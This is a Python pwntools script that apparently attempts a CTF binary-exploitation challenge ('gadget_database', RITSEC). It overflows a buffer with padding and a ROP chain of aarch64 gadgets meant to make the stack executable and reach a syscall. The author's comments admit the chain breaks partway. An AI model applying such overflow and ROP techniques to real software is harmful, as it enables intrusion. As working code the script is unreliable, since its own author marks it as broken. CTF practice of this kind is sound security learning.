from pwn import *

context.terminal = ['kitty']

context.binary = 'gadget_database'


r = gdb.debug(context.binary.path,
'''b *0x454814
''')

#r = remote("ctf.ritsec.club", 30865)

r.readuntil(b'password')

key = b'RS{REALFLAG}'

r.sendline(key)

r.readuntil(b'query\n')


x9 = p64(0x400000001000)
pad = b'A'*8 + b'B'*8 + b'C'*8 + b'D'*8


syscall = 0x000000000041ff78

make_stack_exec = 0x44c450

# Need stack end in x0

#0x000000000044c754 : mov x0, x10 ; str x8, [x9, #8] ; ldp x29, x30, [sp], #0x30 ; ret
load_x0_and_others = 0x000000000044c754

#0x00000000004493dc : mov x0, x1 ; ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x50 ; ret

#0x0000000000454814 : ldr x1, [sp, #0x28] ; cmp x0, #0 ; ldp x29, x30, [sp], #0x30 ; csel x0, x1, x0, ne ; ret

stack_end = p64(0x400000801000)


gadgets = [
    #make_stack_exec,
    0x454814,
    0xdeadbeef, # junk padding I think
    0x4493dc,
    0xdeadbeef,
    0x33333333,
    0x33333333,
    0x400000801000, # stack end
    0x33333333,
    make_stack_exec, # it breaks here I give up lol
    0x44444444,
    0x55555555,
    0x66666666,
    0x77777777,
    syscall
]


chain = b''
for i in gadgets:
    chain += p64(i)


r.sendline(key + pad + chain)
r.interactive()
